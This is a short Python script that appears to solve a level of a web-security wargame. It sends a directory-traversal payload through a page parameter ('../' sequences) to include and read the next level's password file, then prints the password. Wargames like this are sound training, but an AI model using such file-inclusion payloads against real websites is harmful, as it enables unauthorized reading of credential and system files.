#!/usr/bin/env python3

import requests
import base64
import re
from levels_credentials import credentials, folder

level_url = credentials[7]["url"]
level_username = credentials[7]["level"]
level_password = credentials[7]["password"]

next_level_url = credentials[8]["url"]
next_level_username = credentials[8]["level"]

credentials = "%s:%s" % (level_username, level_password)
auth_creds = base64.b64encode(credentials.encode("ascii"))
heads = {"Authorization": "Basic %s" % auth_creds.decode("ascii"), "Referer": next_level_url}

include_folder = "../" * 7 + ".." + folder + next_level_username
request_url = level_url + "?page=" + include_folder
response = requests.get(request_url, headers=heads)

data = response.text
strings = re.split('\n|:|\s|<|>', data)
next_password = strings[strings.index(next_level_username) - 9] 

print(next_password)
